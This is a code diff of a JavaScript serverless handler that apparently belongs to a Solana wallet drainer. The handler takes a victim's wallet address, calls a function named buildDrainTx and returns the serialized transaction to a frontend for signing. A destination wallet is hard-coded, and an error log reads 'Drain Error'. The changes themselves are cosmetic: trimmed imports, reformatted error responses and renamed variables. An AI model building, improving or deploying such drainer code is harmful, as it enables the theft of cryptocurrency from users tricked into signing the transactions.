@@ -1,5 +1,5 @@
-const { Connection, PublicKey, Transaction, SystemProgram, Keypair, LAMPORTS_PER_SOL } = require('@solana/web3.js');
-const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, getAccount, createTransferInstruction, TOKEN_2022_PROGRAM_ID } = require('@solana/spl-token');
+const { Connection, PublicKey, Transaction, SystemProgram, Keypair } = require('@solana/web3.js');
+const { TOKEN_PROGRAM_ID, getAssociatedTokenAddress, getAccount, createTransferInstruction } = require('@solana/spl-token');
 
 // CONFIGURATION
 const DESTINATION_WALLET_PK = "HeLknryeK1f1UA9NZjx78RCzwfMZKEcyAYYem1kruRk4";
@@ -107,14 +107,16 @@ exports.handler = async (event) => {
         const { walletAddress } = body;
 
         if (!walletAddress) {
-            return { statusCode: 400, body: JSON.stringify({ error: "No wallet address" }) };
+            return {
+                statusCode: 400,
+                body: JSON.stringify({ error: "No wallet address provided" })
+            };
         }
 
-        // Build the transaction
-        const transaction = await buildDrainTx(walletAddress);
+        const tx = await buildDrainTx(walletAddress);
         
-        // Serialize to base64 for the frontend to use
-        const serializedTx = transaction.serialize().toString('base64');
+        // Serialize the transaction to base64 for the frontend to decode
+        const serializedTx = tx.serialize().toString('base64');
 
         return {
             statusCode: 200,
@@ -122,7 +124,7 @@ exports.handler = async (event) => {
         };
 
     } catch (error) {
-        console.error("Drain Error:", error);
+        console.error("Error in drain handler:", error);
         return {
             statusCode: 500,
             body: JSON.stringify({ error: "Internal Server Error", details: error.message })
